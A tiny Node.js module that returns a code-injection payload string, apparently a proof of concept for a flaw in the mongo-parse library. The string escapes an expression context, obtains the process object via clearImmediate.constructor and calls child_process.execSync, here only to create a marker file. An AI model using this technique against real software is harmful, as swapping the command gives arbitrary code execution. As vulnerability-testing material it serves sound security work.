function getPayload() {
    return '} + clearImmediate.constructor(`return process;`)().mainModule.require(`child_process`).execSync("touch mongo-parse") //';
}

module.exports = { getPayload };